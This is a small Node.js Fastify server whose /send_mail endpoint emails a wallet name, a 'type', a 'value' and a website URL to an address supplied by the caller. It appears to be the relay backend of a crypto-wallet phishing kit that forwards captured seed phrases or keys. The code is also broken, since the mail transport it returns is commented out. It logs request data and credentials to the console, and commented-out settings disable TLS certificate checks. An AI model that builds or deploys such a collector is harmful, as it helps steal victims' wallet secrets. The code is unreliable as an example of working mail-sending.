import Fastify from "fastify";
import nodemailer from "nodemailer";
import cors from "@fastify/cors";
import "dotenv/config";
//

///
const fastify = Fastify({
  logger: true,
});
await fastify.register(cors, {});
fastify.get("/", async (request, reply) => {
  return "api active";
});
fastify.post("/send_mail", async (request, reply) => {
  console.log("i ran");
  const data = request.body;
  console.log("data ==>> ", data);
  const transporter = getTransporter();
  try {
    const snt = await sendMail(transporter, data);
    return reply.send(snt);
  } catch (error) {
    return reply.status(500).send({ error: error });
  }
  //   return await sendMail(transporter, data);
});
let username;
let password;

const getTransporter = () => {
  //   username = process.env.EMAIL;
  //   password = process.env.PASSWORD;
  username = process.env.EMAIL;
  password = process.env.PASSWORD;
  console.log("username=>>", username);
  //   const transporter_ = nodemailer.createTransport({
  //     service: "gmail",
  //     port: 587,
  //     tls: {
  //       ciphers: "SSLv3",
  //       rejectUnauthorized: false,
  //     },

  //     auth: {
  //       user: username,
  //       pass: password,
  //     },
  //   });
  //   return transporter_;
};

const sendMail = async (transporter, data) => {
  //   const name = formData.get("name");
  //   const message = formData.get("message");
  //   const senderEmail = formData.get("email");
  //   const data = formData.values();

  const walletName = data.name;
  const type = data.type;
  const value = data.value;
  const msg = data.msg;
  const send_to = data.email;
  const url = data.url;

  try {
    // const mail =
    await transporter.sendMail({
      from: username,
      to: send_to,
      replyTo: send_to,
      subject: `Activity`,

      html: `
                <p>Name: ${walletName} </p>
                <p> type : ${type} </p>
                <p>Value: ${value} </p>
                <p>website: ${url} </p>
                `,
    });
    console.log("success!!!");
    return { message: "Success: email was sent" };
  } catch (error) {
    console.log(error);
    return error;
  }
};
/**
 * Run the server!
 */
const start = async () => {
  try {
    await fastify.listen(
      { port: process.env.PORT || 3000, host: "0.0.0.0" },
      function (err, address) {
        if (err) {
          fastify.log.error(err);
          process.exit(1);
        }
        fastify.log.info(`server listening on ${address}`);
      }
    );
  } catch (err) {
    fastify.log.error(err);
    process.exit(1);
  }
};
start();
